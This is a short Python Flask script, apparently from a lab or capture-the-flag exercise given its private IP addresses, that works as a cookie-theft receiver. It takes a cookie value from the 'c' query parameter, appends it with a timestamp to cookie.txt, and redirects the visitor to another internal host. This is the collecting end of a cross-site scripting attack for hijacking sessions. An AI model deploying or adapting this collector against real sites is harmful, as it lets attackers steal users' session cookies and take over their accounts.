from flask import Flask,request,redirect
from datetime import datetime

app= Flask(__name__) 

@app.route('/')
def cookie():

	cookie = request.args.get('c')
	f=open("cookie.txt","a")
	f.write(cookie + ' ' + str(datetime.now()) + '\n')
	f.close()

	return redirect("http://10.10.12.24")

if __name__ == "__main__":
	app.run(host= '10.17.9.112',port=5000)
